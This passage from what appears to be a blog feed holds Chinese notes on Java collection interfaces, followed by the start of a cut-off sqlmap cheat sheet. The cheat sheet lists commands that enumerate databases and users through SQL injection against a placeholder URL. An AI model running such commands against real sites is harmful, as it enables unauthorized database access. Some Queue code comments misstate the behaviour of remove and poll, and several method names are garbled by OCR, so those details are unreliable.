rel="noopener">https://www.yiibai.com/java/java-listiterator.html</a></p></blockquote><p>它从Java 1.2开始提供。</p><p>它扩展了<code>Iterator</code>接口。</p><p>它仅对<code>List</code>实现的类有用。</p><p>与<code>Iterator</code>不同，它支持所有四种操作：CRUD(CREATE，READ，UPDATE和DELETE)。支持<code>add</code>操作。<code>add</code>方法只依赖于迭代器的位置(在光标前插入)， 而 <code>remove</code> 方法依赖于迭代器的状态(删除刚刚越过的元素)。<code>set</code> 方法用一个新元素取代调用 next 或 previous 方法返回的上一个元素。</p><p>与<code>Iterator</code>不同，它支持正向和反向迭代。</p><p>它是一个双向迭代器。</p><p>它没有当前元素; 它的光标位置总是位于调用<code>previous()</code>返回的元素和调用<code>next()</code>返回的元素之间。</p><p>Java <code>ListIterator</code>接口具有以下方法。</p><table><thead><tr><th>编号</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>void add(E e)</code></td><td>将指定的元素插入列表中。</td></tr><tr><td>2</td><td><code>boolean hasNext()</code></td><td>如果此列表迭代器在向前遍历列表时具有元素，则返回<code>true</code>。</td></tr><tr><td>3</td><td><code>boolean hasPrevious()</code></td><td>如果此列表迭代器在反向遍历列表时具有元素，则返回<code>true</code>。</td></tr><tr><td>4</td><td><code>E next()</code></td><td>返回列表中的下一个元素。</td></tr><tr><td>5</td><td><code>int nextIndex()</code></td><td>返回元素的索引。</td></tr><tr><td>6</td><td><code>E previous()</code></td><td>返回列表中的上一个元素并向后移动光标位置。</td></tr><tr><td>7</td><td><code>int previousIndex()</code></td><td>返回元素的索引。</td></tr><tr><td>8</td><td><code>void remove()</code></td><td>从列表中删除由<code>next()</code>或<code>previous()</code>返回的最后一个元素。</td></tr><tr><td>9</td><td><code>void set(E e)</code></td><td>用指定的元素替换由<code>next()</code>或<code>previous()</code>返回的最后一个元素。</td></tr></tbody></table><h4 id="RandomAccess接口"><a href="#RandomAccess接口" class="headerlink" title="RandomAccess接口"></a>RandomAccess接口</h4><p>这个接口不包含任何方法， 不过可以用它来测试一个特定的集合是否支持高效的随机访问：</p><h4 id="Collection-接口"><a href="#Collection-接口" class="headerlink" title="Collection 接口"></a>Collection 接口</h4><blockquote><p>详细可参考：<a href="https://www.jianshu.com/p/b878a4e1c762" target="_blank" rel="noopener">https://www.jianshu.com/p/b878a4e1c762</a></p></blockquote><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203210332782.png" alt="image-20201203210332782"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203210212790.png" alt="image-20201203210212790"></p><blockquote><p>• Iterator <E> iterator()<br>返回一个用于访问集合中每个元素的迭代器。<br>• int size()<br>返回当前存储在集合中的元素个数。<br>• boolean isEmpty()<br>如果集合中没有元素， 返回 true。<br>• boolean contains(Object obj)<br>如果集合中包含了一个与 obj 相等的对象， 返回 true。<br>• boolean containsAl 1(Collection<?> other)如果这个集合包含 other 集合中的所有元素， 返回 trueo• boolean add(Object element)将一个元素添加到集合中。如果由于这个调用改变了集合，返回 true。• boolean addAl 1(Col 1 ection<? extends E> other)将 other 集合中的所有元素添加到这个集合。 如果由于这个调用改变了集合， 返回 true。• boolean remove(Object obj)从这个集合中删除等于 obj 的对象。 如果有匹配的对象被删除， 返回 true。• boolean removeAl 1(Col 1ection<?> other)<br>从这个集合中删除 other 集合中存在的所有元素。如果由于这个调用改变了集合，返回 true。<br>• default boolean removelf(Predicate<? super E> filter)8从这个集合删除 filter 返回 true 的所有元素。 如果由于这个调用改变了集合， 则返回 true。• void clear()从这个集合中删除所有的元素。• boolean retainAl 1(Collection<?> other)<br>从这个集合中删除所有与 other 集合中的元素不同的元素。 如果由于这个调用改变了<br>集合， 返回 true。<br>• Object[]toArray()<br>返回这个集合的对象数组。<br>• <T> T[]toArray(T[] arrayToFi11)<br>返回这个集合的对象数组。 如果 arrayToFill 足够大， 就将集合中的元素填入这个数组<br>中。剩余空间填补 null ; 否则， 分配一个新数组， 其成员类型与 arrayToFill 的成员类<br>型相同， 其长度等于集合的大小， 并填充集合元素。</p></blockquote><h4 id="list接口"><a href="#list接口" class="headerlink" title="list接口"></a>list接口</h4><p>在collection的基础上添加了扩展方法，</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203211452261.png" alt="image-20201203211452261"></p><blockquote><p>• ListIterator<E> 1istIterator( )<br>返回一个列表迭代器， 以便用来访问列表中的元素。<br>• ListIterator<E> 1istIterator(int index )<br>返回一个列表迭代器， 以便用来访问列表中的元素， 这个元素是第一次调用 next 返回的给定索引的元素。<br>• void add( int i ,E element )<br>在给定位置添加一个元素。<br>• void addAll ( int i ,Collection&lt;? extends E&gt; elements )<br>将某个集合中的所有元素添加到给定位置。<br>• E remove( int i )<br>删除给定位置的元素并返回这个元素。<br>• E get( int i )<br>获取给定位置的元素。<br>• E set(int i ,E element )<br>用新元素取代给定位置的元素， 并返回原来那个元素。<br>• int indexOf( Object element )<br>返回与指定元素相等的元素在列表中第一次出现的位置， 如果没有这样的元素将返回-1。<br>• int 1 astlndexOf(Object element)<br>返回与指定元素相等的元素在列表中最后一次出现的位置， 如果没有这样的元素将返<br>回 -U</p></blockquote><h4 id="set接口"><a href="#set接口" class="headerlink" title="set接口"></a>set接口</h4><blockquote><p>参考：<a href="https://www.yiibai.com/java/java_set_interface.html" target="_blank" rel="noopener">https://www.yiibai.com/java/java_set_interface.html</a></p></blockquote><p><code>Set</code>是一个不能包含重复元素的<code>Collection</code>。它模拟了数学集合抽象。</p><p><code>Set</code>接口仅包含从<code>Collection</code>接口继承的方法，并添加禁止重复元素的限制。</p><p><code>Set</code>还为<code>equals</code>和<code>hashCode</code>操作的行为添加了一个更强的规范，允许<code>Set</code>实例有意义地进行比较，即使它们的实现类型不同。</p><p><code>Set</code>声明的方法如下表中所示 - </p><table><thead><tr><th>编号</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>add()</code></td><td>添加一个对象到集合中，禁止添加相同的元素。</td></tr><tr><td>2</td><td><code>clear()</code></td><td>从集合中删除所有对象。</td></tr><tr><td>3</td><td><code>contains()</code></td><td>如果指定的对象是集合中的元素，则返回<code>true</code>。</td></tr><tr><td>4</td><td><code>isEmpty()</code></td><td>如果集合没有元素，则返回<code>true</code>。</td></tr><tr><td>5</td><td><code>iterator()</code></td><td>返回集合的<code>Iterator</code>对象，该对象可用于检索对象。</td></tr><tr><td>6</td><td><code>remove()</code></td><td>从集合中删除指定对象。</td></tr><tr><td>7</td><td><code>size()</code></td><td>返回集合中的元素数。</td></tr></tbody></table><p>和list对比：</p><p>1、List 接口能直接设置或获取某个元素的值，而Set接口不能。</p><p>2、List 接口能直接在指定位置删除、增加元素，而Set接口不能。</p><p>3、List 接口有 listIterator 方法，可以获得 ListIterator 对象，而 Set 接口不能。Set 只能通过 iterator 迭代的方式获取元素。</p><h4 id="sortedset接口"><a href="#sortedset接口" class="headerlink" title="sortedset接口"></a>sortedset接口</h4><blockquote><p>参考：<a href="https://www.yiibai.com/java/java_sortedset_interface.html" target="_blank" rel="noopener">https://www.yiibai.com/java/java_sortedset_interface.html</a></p></blockquote><p><code>SortedSet</code>接口扩展<code>Set</code>接口并声明按升序排序的集合的行为。除了<code>Set</code>定义的那些方法之外，<code>SortedSet</code>接口还声明了一些自己的方法。</p><p>SortedSet 和 SortedMap 接口会提供用于排序的比较器对象，这两个接口定义了可以得到<br>集合子集视图的方法。</p><p>当调用集中没有包含任何项时，有几种方法抛出<code>NoSuchElementException</code>异常。当对象与集合中的元素不兼容时，抛出<code>ClassCastException</code>异常。</p><p>如果尝试使用<code>null</code>对象并且集合中不允许<code>null</code>，则抛出<code>NullPointerException</code>异常。</p><table><thead><tr><th>编号</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>Comparator comparator()</code></td><td>返回调用有序集的比较器。如果自然排序用于此集合，则返回<code>null</code>。</td></tr><tr><td>2</td><td><code>Object first()</code></td><td>返回调用有序集合中的第一个元素。</td></tr><tr><td>3</td><td><code>SortedSet headSet(Object end)</code></td><td>返回一个<code>SortedSet</code>对象，其中包含调用有序集合中包含的小于<code>end</code>的元素。返回的有序集中的元素也是调用的有序集引用。</td></tr><tr><td>4</td><td><code>Object last()</code></td><td>返回调用有序集合中的最后一个元素。</td></tr><tr><td>5</td><td><code>SortedSet subSet(Object start, Object end)</code></td><td>返回一个<code>SortedSet</code>对象，其中包含<code>start</code>至<code>end-1</code>之间的元素。返回集合中的元素也是调用对象引用。</td></tr><tr><td>6</td><td><code>SortedSet tailSet(Object start)</code></td><td>返回一个<code>SortedSet</code>对象，其中包含有序集合中包含的大于或等于<code>start</code>的元素。返回集中的元素也是调用对象引用。</td></tr></tbody></table><h4 id="NavigableSet接口"><a href="#NavigableSet接口" class="headerlink" title="NavigableSet接口"></a>NavigableSet接口</h4><blockquote><p>• E higher(E value)<br>• E lower(E value)<br>返回大于 value 的最小元素或小于 value 的最大元素，如果没有这样的元素则返回 null。<br>• E ceiling(E value)<br>• E floor(E value)<br>返回大于等于 vaiue 的最小元素或小于等于 value 的最大元素， 如果没有这样的元素<br>则返回 null。<br>• E pollFirst()<br>• E pollLast<br>删除并返回这个集中的最大元素或最小元素， 这个集为空时返回 null。<br>• Iterator<E> descendingIterator()<br>返回一个按照递减顺序遍历集中元素的迭代器。</p></blockquote><h4 id="queue接口"><a href="#queue接口" class="headerlink" title="queue接口"></a>queue接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//extend correction 具有集合的基本功能</span></span><br><span class="line">    <span class="comment">// 添加一个元素到队列，在先进先出队列中，是添加到队列尾部</span></span><br><span class="line">    <span class="comment">// 如果由于容量不足插入失败，则抛出异常，不会返回false</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 和add方法一样，不过不同之处在于，这个方法添加失败一般是返回false，而不是抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 移除队列尾部的元素（最后进来的元素），如果队列为空，则抛出异常，不返回false</span></span><br><span class="line">    <span class="function">E <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 和remove方法一样，不过这个方法在队列为空时会返回false，不抛出异常</span></span><br><span class="line">    <span class="function">E <span class="title">poll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看队列头部的元素（最先进来的元素），如果队列为空，则抛出异常，不返回null</span></span><br><span class="line">    <span class="function">E <span class="title">element</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 和element方法一样，不过这个在队列为空时，返回null，不抛出异常</span></span><br><span class="line">    <span class="function">E <span class="title">peek</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>• boolean add(E element )<br>• boolean offer(E element )<br>如果队列没有满，将给定的元素添加到这个双端队列的尾部并返回 true。如果队列满<br>了，第一个方法将拋出一个 IllegalStateException, 而第二个方法返回 false。<br>• E remove( )<br>• E poll ( )<br>假如队列不空， 删除并返回这个队列头部的元素。 如果队列是空的，第一个方法抛出<br>NoSuchElementException, 而第二个方法返回 null。<br>• E element( )<br>• E peek( )<br>如果队列不空，返回这个队列头部的元素， 但不删除。 如果队列空，第一个方法将拋<br>出一个 NoSuchElementException, 而第二个方法返回 null。</p></blockquote><p>在JDK里面没有一个队列的实现是仅仅实现Queue接口定义的功能。可能是因为具有基本功能的队列实现比较简单而且实际的用途有点少。队列的实现基本可以分为：1.并发队列(ConcurrentLinkedQueue); 2.阻塞队列（ArrayBlockingQueue， LinkedBlockingQueue）； 3.双端队列（Deque, ArrayDeque, LinkedList, ConcurrentLinkedDeque）; 4:优先级队列(PriorityQueue, PriorityBlockingQueue) 每种类型的队列都是针对不同的应用场景的，所以还是需要仔细区分来选择合适的队列实现。</p><h4 id="deque接口"><a href="#deque接口" class="headerlink" title="deque接口"></a>deque接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Deque</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// *** Deque methods ***</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">offerFirst</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">offerLast</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">removeFirst</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">removeLast</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">pollFirst</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">pollLast</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">getFirst</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">getLast</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">peekFirst</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">peekLast</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeFirstOccurrence</span><span class="params">(Object o)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeLastOccurrence</span><span class="params">(Object o)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// *** Queue methods ***</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">remove</span><span class="params">()</span></span>;        </span><br><span class="line">    <span class="function">E <span class="title">poll</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">element</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">peek</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// *** Stack methods ***</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *** Collection methods ***</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">Iterator&lt;E&gt; <span class="title">descendingIterator</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Deque</code>表示双端队列。双端队列是在两端都可以进行插入和删除的队列。<code>Deque</code>是一个比<code>Stack</code>和<code>Queue</code>功能更强大的接口，它同时实现了栈和队列的功能。<code>ArrayDeque</code>和<code>LinkeList</code>实现了<code>Deque</code>接口。</p><p>注意：<code>Deque</code>既可以用作后进先出的栈，也可以用作先进先出的队列。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203213901718.png" alt="image-20201203213901718"></p><blockquote><p>表：<code>Deque</code>接口方法表</p></blockquote><table><thead><tr><th align="left"><code>Queue</code> Method</th><th align="left">Equivalent <code>Deque</code> Method</th></tr></thead><tbody><tr><td align="left"><code>add(e)</code></td><td align="left"><code>addLast(e)</code></td></tr><tr><td align="left"><code>offer(e)</code></td><td align="left"><code>offerLast(e)</code></td></tr><tr><td align="left"><code>remove()</code></td><td align="left"><code>removeFirst()</code></td></tr><tr><td align="left"><code>poll()</code></td><td align="left"><code>pollFirst()</code></td></tr><tr><td align="left"><code>element()</code></td><td align="left"><code>getFirst()</code></td></tr><tr><td align="left"><code>peek()</code></td><td align="left"><code>peekFirst()</code></td></tr></tbody></table><blockquote><p>表：<code>Deque</code>与<code>Queue</code>方法比较表</p></blockquote><p><strong>插入</strong></p><p><code>addFirst</code>和<code>offerFirst</code>在<code>Deque</code>实例头部插入元素。<br> <code>addLast</code>和<code>offerLast</code>在<code>Deque</code>实例尾部插入元素。<br> 当<code>Deque</code>实现类为有限容量时，优先使用<code>offerFirst</code>和<code>offerLast</code>，因为<code>addFirst</code>在队列满的时候可能会插入失败而抛出异常。</p><p><strong>删除</strong></p><p><code>removeFirst</code>和<code>pollFirst</code>从<code>Deque</code>实例头部移除元素。<br> <code>removeLast</code>和<code>pollLast</code>从<code>Deque</code>实例尾部移除元素。<br> 当<code>Deque</code>为空时，<code>pollFirst</code>和<code>pollLast</code>将会返回<code>null</code>，而<code>removeFirst</code>和<code>removeLast</code>将会抛出异常。</p><p><strong>检索</strong></p><p><code>getFirst</code>和<code>peekFirst</code>获取<code>Deque</code>实例的第一个元素，但是不会将元素从<code>Deque</code>实例中删除。类似地，<code>getLast</code>和<code>peekLast</code>获取最后一个元素。当<code>Deque</code>为空时，<code>getFirst</code>和<code>getLast</code>将会抛出异常，而<code>peekFirst</code>和<code>peekLast</code>将会返回<code>null</code>。</p><p>除了基本的插入、删除和检索方法外，还有两个预定义的方法：<code>removeFirstOccurence</code>和<code>removeLastOccurence</code>。这两个方法见名知意。返回<code>true</code>的时候表示元素存在于队列，并且已经被删除。返回<code>false</code>时表示元素不存在于队列中，并且队列没有改变。</p><h4 id="map接口"><a href="#map接口" class="headerlink" title="map接口"></a>map接口</h4><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203210422581.png" alt="image-20201203210422581"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/image-20201203214028197.png" alt="image-20201203214028197"></p><p>Map集合的特点是：通过key值找到对应的value值，key值是唯一的，value可以重复。Map中的元素是无序的，但是也有实现了排序的Map实现类，如：TreeMap。</p><p>上面Map接口提供的方法大致可以分为下面几种：</p><p><strong>1、put/putAll/remove/clear  增加删除   get/values 获取值</strong></p><p><strong>2、containKey/containValue 判断</strong></p><p><strong>3、entrySet/keySet 获取迭代</strong></p><p><strong>4、equals/hashcode 比较</strong></p><p>基本上所有的 Map 接口实现类都使用 put() 方法存入数据、用get() 方法去除数据，使用 entrySet/keySet 迭代获取 Map 数据。</p><table><thead><tr><th>序号</th><th>方法</th></tr></thead><tbody><tr><td>1</td><td>void clear( )  从此映射中移除所有映射关系（可选操作）。</td></tr><tr><td>2</td><td>boolean containsKey(Object k) 如果此映射包含指定键，则返回 true。</td></tr><tr><td>3</td><td>boolean containsValue(Object v) 如果此映射将一个或多个键映射到指定值，则返回 true。</td></tr><tr><td>4</td><td>Set entrySet( ) 返回此映射中包含的映射关系的 Set 视图。</td></tr><tr><td>5</td><td>boolean equals(Object obj) 比较指定的对象与此映射是否相等。</td></tr><tr><td>6</td><td>Object get(Object k) 返回指定键所映射的值；如果此映射不包含该键的映射关系，则返回 null。</td></tr><tr><td>7</td><td>int hashCode( ) 返回此映射的哈希码值。</td></tr><tr><td>8</td><td>boolean isEmpty( ) 如果此映射未包含键-值映射关系，则返回 true。</td></tr><tr><td>9</td><td>Set keySet( ) 返回此映射中包含的键的 Set 视图。</td></tr><tr><td>10</td><td>Object put(Object k, Object v) 将指定的值与此映射中的指定键关联（可选操作）。</td></tr><tr><td>11</td><td>void putAll(Map m) 从指定映射中将所有映射关系复制到此映射中（可选操作）。</td></tr><tr><td>12</td><td>Object remove(Object k) 如果存在一个键的映射关系，则将其从此映射中移除（可选操作）。</td></tr><tr><td>13</td><td>int size( ) 返回此映射中的键-值映射关系数。</td></tr><tr><td>14</td><td>Collection values( ) 返回此映射中包含的值的 Collection 视图。</td></tr><tr><td>15</td><td>default V getOrDefault(Object key, V defaultValue) 获得与键关联的值； 返回与键关联的对象， 或者如果未在映射中找到这个键， 则返回defaultValue。</td></tr></tbody></table><h4 id="sortedmap接口"><a href="#sortedmap接口" class="headerlink" title="sortedmap接口"></a>sortedmap接口</h4><p>SortedSet 和 SortedMap 接口会提供用于排序的比较器对象，这两个接口定义了可以得到<br>集合子集视图的方法。</p><p><code>TreeMap</code>实现了<code>SortedMap</code>接口，保证了有序性。默认的排序是根据<code>key</code>值进行升序排序，也可以重写<code>comparator</code>方法来根据<code>value</code>进行排序。</p><p><code>SortedMap</code>接口扩展了<code>Map</code>接口，它确保条目按升序键维护。</p><p>当调用映射中没有项时，有几种方法会抛出<code>NoSuchElementException</code>异常。当对象与映射中的元素不兼容时，抛出<code>ClassCastException</code>异常。如果在映射中不允许<code>null</code>时，如果尝试使用<code>null</code>对象，则抛出<code>NullPointerException</code>异常。</p><p><code>SortedMap</code>接口声明的方法如下表中所示 - </p><table><thead><tr><th>编号</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>Comparator comparator()</code></td><td>返回调用有序映射的比较器。如果自然排序用于调用映射，则返回<code>null</code>。</td></tr><tr><td>2</td><td><code>Object firstKey()</code></td><td>返回调用映射中的第一个键。</td></tr><tr><td>3</td><td><code>SortedMap headMap(Object end)</code></td><td>返回键小于结束的那些映射条目的有序映射。</td></tr><tr><td>4</td><td><code>Object lastKey()</code></td><td>返回调用映射中的最后一个键。</td></tr><tr><td>5</td><td><code>SortedMap subMap(Object start, Object end)</code></td><td>返回包含键大于或等于<code>start</code>且小于<code>end</code>的条目的映射。</td></tr><tr><td>6</td><td><code>SortedMap tailMap(Object start)</code></td><td>返回包含键大于或等于<code>start</code>的条目的映射。</td></tr></tbody></table><h4 id="navigablemap接口"><a href="#navigablemap接口" class="headerlink" title="navigablemap接口"></a>navigablemap接口</h4><p>NavigableSet扩展了 SortedSet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">SortedMap提供了获取最大值与最小值的方法，但对于一个已经排序的数据集，除了最大值与最小值之外，</span><br><span class="line">我们还想对任何一个元素，找到比它小的值和比它大的值，还可以按照原有的顺序倒序排序等，</span><br><span class="line">这时候就运用到NavigableMap接口提供的如下方法。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到第一个比指定的key小的值</span></span><br><span class="line">Map.<span class="function">Entry&lt;K,V&gt; <span class="title">lowerEntry</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到第一个比指定的key小的key</span></span><br><span class="line"><span class="function">K <span class="title">lowerKey</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到第一个小于或等于指定key的值</span></span><br><span class="line">Map.<span class="function">Entry&lt;K,V&gt; <span class="title">floorEntry</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到第一个小于或等于指定key的key</span></span><br><span class="line"><span class="function">K <span class="title">floorKey</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  找到第一个大于或等于指定key的值</span></span><br><span class="line">Map.<span class="function">Entry&lt;K,V&gt; <span class="title">ceilingEntry</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//找到第一个大于或等于指定key的key</span></span><br><span class="line"><span class="function">K <span class="title">ceilingKey</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到第一个大于指定key的值</span></span><br><span class="line">Map.<span class="function">Entry&lt;K,V&gt; <span class="title">higherEntry</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//找到第一个大于指定key的key</span></span><br><span class="line"><span class="function">K <span class="title">higherKey</span><span class="params">(K key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取最小值</span></span><br><span class="line">Map.<span class="function">Entry&lt;K,V&gt; <span class="title">firstEntry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取最大值</span></span><br><span class="line">Map.<span class="function">Entry&lt;K,V&gt; <span class="title">lastEntry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除最小的元素</span></span><br><span class="line">Map.<span class="function">Entry&lt;K,V&gt; <span class="title">pollFirstEntry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除最大的元素</span></span><br><span class="line">Map.<span class="function">Entry&lt;K,V&gt; <span class="title">pollLastEntry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回一个倒序的Map</span></span><br><span class="line"><span class="function">NavigableMap&lt;K,V&gt; <span class="title">descendingMap</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个Navigable的key的集合，NavigableSet和NavigableMap类似</span></span><br><span class="line"><span class="function">NavigableSet&lt;K&gt; <span class="title">navigableKeySet</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对上述集合倒序</span></span><br><span class="line"><span class="function">NavigableSet&lt;K&gt; <span class="title">descendingKeySet</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用总结</title>
      <link href="/2020/12/02/sqlmap_used/"/>
      <url>/2020/12/02/sqlmap_used/</url>
      
        <content type="html"><![CDATA[<blockquote><p>sqlmap常用命令</p></blockquote><a id="more"></a><h2 id="最基本命令"><a href="#最基本命令" class="headerlink" title="最基本命令"></a>最基本命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch</span><br><span class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch --dbs</span><br><span class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch --current-db</span><br><span class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch --users</span><br><span class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch --current-user</span><br><span 